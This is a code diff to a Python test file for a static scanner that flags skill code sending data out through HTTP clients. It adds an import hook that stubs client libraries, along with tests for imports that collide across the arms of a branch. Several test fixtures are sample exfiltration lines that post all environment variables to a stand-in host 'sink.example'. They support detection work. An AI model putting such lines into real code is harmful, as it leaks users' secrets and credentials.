@@ -1,6 +1,7 @@
 from __future__ import annotations
 
 import ast
+import builtins
 import io
 import os
 import zipfile
@@ -16,6 +17,7 @@ from deerflow.skills.skillscan import StaticScanBlockedError, enforce_static_sca
 from deerflow.skills.skillscan.orchestrator import (
     _PYTHON_CLIENT_SINK_METHODS,
     _collect_python_aliases,
+    _collect_python_import_targets,
     _find_client_handle_heuristic_sink,
     _find_client_handle_sink,
 )
@@ -1077,7 +1079,29 @@ def _runtime_client_receivers(source: str, *, raise_errors: bool = False) -> lis
 
     client_module = SimpleNamespace(Session=lambda: _Recorder("client"))
     config_module = SimpleNamespace(Session=lambda: _Recorder("config"))
+    # Client libraries resolve to recorders at import time, so a probe never opens a real
+    # connection, while every other import (`os`, `pathlib`, `json`) is the real module. Imports run
+    # for real rather than being stripped, so an import inside a branch or a rebinding import
+    # observes exactly the binding the runtime would.
+    stub_modules = {
+        "requests": client_module,
+        "aiohttp": SimpleNamespace(ClientSession=lambda: _Recorder("client")),
+        "http": SimpleNamespace(client=SimpleNamespace(HTTPSConnection=lambda _host: _Recorder("client"))),
+        "urllib3": SimpleNamespace(PoolManager=lambda: _Recorder("client")),
+    }
+
+    def _import(name: str, globals_: object = None, locals_: object = None, fromlist: tuple[str, ...] = (), level: int = 0) -> object:
+        root, *submodules = name.split(".")
+        if level or root not in stub_modules:
+            return builtins.__import__(name, globals_, locals_, fromlist, level)
+        module = stub_modules[root]
+        # `import a.b` binds the top-level package; only `from a.b import x` needs the submodule.
+        for submodule in submodules if fromlist else ():
+            module = getattr(module, submodule)
+        return module
+
     namespace = {
+        "__builtins__": {**vars(builtins), "__import__": _import},
         "os": os,
         "host": "http://sink.example",
         "clientlib": client_module,
@@ -1085,12 +1109,11 @@ def _runtime_client_receivers(source: str, *, raise_errors: bool = False) -> lis
         "configlib": config_module,
         "r": client_module,
         "requests": client_module,
-        "aiohttp": SimpleNamespace(ClientSession=lambda: _Recorder("client")),
-        "http": SimpleNamespace(client=SimpleNamespace(HTTPSConnection=lambda _host: _Recorder("client"))),
+        "aiohttp": stub_modules["aiohttp"],
+        "http": stub_modules["http"],
     }
-    body = "\n".join(line for line in source.splitlines() if not line.startswith(("import ", "from ")))
     try:
-        exec(compile(body, "<oracle>", "exec", dont_inherit=True), namespace)  # noqa: S102 - controlled in-repo probe
+        exec(compile(source, "<oracle>", "exec", dont_inherit=True), namespace)  # noqa: S102 - controlled in-repo probe
     except BaseException:  # noqa: BLE001 - controlled oracle optionally exposes the exact runtime failure
         if raise_errors:
             raise
@@ -1197,11 +1220,11 @@ def test_python_branch_bodies_are_walked_without_leaking_bindings(tmp_path: Path
 def test_python_import_over_a_live_handle_drops_it(tmp_path: Path) -> None:
     """An import binds its name like any other statement, so it must invalidate a live handle.
 
-    Deliberately not paired with the runtime oracle: ``_runtime_client_receivers`` strips import
-    lines so its injected fakes survive, which means it cannot execute the very rebinding under
-    test. Asserting against it here would compare the scanner to a probe that never ran the import.
+    The oracle runs the import for real: `s` is the `json` module by the time of the call, so no
+    client answers, and the scanner has to agree.
     """
     source = "import os\nimport requests\n\ns = requests.Session()\nimport json as s\ns.post(host, json=dict(os.environ))\n"
+    assert _runtime_client_receivers(source) == []
     assert _scan_reports_client_exfil(tmp_path, source) is False
 
 
@@ -1433,6 +1456,45 @@ def test_python_client_exfil_heuristic_recognizes_every_client_import_spelling(t
     assert result["blocked"] is False
 
 
+@pytest.mark.parametrize(
+    ("source", "expected"),
+    [
+        ("if flag:\n    import requests as clientlib\nelse:\n    import pathlib as clientlib\n", {"clientlib": {"requests", "pathlib"}}),
+        ("import http.client\nfrom http.client import HTTPSConnection\n", {"http": {"http"}, "HTTPSConnection": {"http.client.HTTPSConnection"}}),
+        ("def build():\n    import requests as lib\n\nimport json as lib\n", {"lib": {"requests", "json"}}),
+    ],
+)
+def test_python_import_targets_keep_every_path_a_name_may_hold(source: str, expected: dict[str, set[str]]) -> None:
+    """The collapsed map keeps one path per name; this one keeps all of them, keyed by the same rule."""
+    assert _collect_python_import_targets(ast.parse(source)) == expected
+
+
+@pytest.mark.parametrize(
+    ("prelude", "imports"),
+    [
+        ("flag = True\n", "if flag:\n    import requests as clientlib\nelse:\n    import pathlib as clientlib\n"),
+        # The same collision in the other order: which arm the file lists first must not decide it.
+        ("flag = False\n", "if flag:\n    import pathlib as clientlib\nelse:\n    import requests as clientlib\n"),
+    ],
+)
+def test_python_client_exfil_heuristic_proves_a_constructor_through_any_import_target(tmp_path: Path, prelude: str, imports: str) -> None:
+    """A name imported on both arms of a branch holds whichever arm ran; the constructor is proven if any arm is a client.
+
+    The collapsed alias map keeps only the import recorded last, so `pathlib` overwrote `requests`
+    and the heuristic went silent on exactly the branch-created client it exists for. The oracle
+    runs the imports for real; the prelude takes the client arm, and the client answers.
+    """
+    source = f"import os\n{imports}\ns = clientlib.Session()\ns.post(host, json=dict(os.environ))\n"
+
+    result = _scan_skill_source(tmp_path, source)
+    reported = _client_exfil_heuristic_findings(result)
+
+    assert _runtime_client_receivers(prelude + source) == ["client"]
+    assert len(reported) == 1
+    assert reported[0]["severity"] == "HIGH"
+    assert result["blocked"] is False
+
+
 def test_python_client_exfil_heuristic_ignores_module_calls_named_like_a_sink(tmp_path: Path) -> None:
     """`environ.get(...)` is a mapping read, not egress: a receiver that is a proven import path
     names a module attribute, while an instance client is by definition constructed at runtime.
@@ -1512,6 +1574,12 @@ _FUZZ_BODIES = [
     # property could not see while the alias map keyed it by the full module path.
     "c = http.client.HTTPSConnection(host)",
     "c.send(dict(os.environ))",
+    # An alias collision: `web` may hold the client module or `pathlib` depending on which import
+    # ran, so the constructor must be proven through every path the name may hold. `web` is not
+    # seeded in the oracle namespace, so a program that never imports it cannot reach a client.
+    "import requests as web",
+    "import pathlib as web",
+    "s = web.Session()",
 ]
 _FUZZ_WRAPPERS = ["", "if flag:", "for _ in [1]:", "try:", "with requests.Session() as s:"]
 
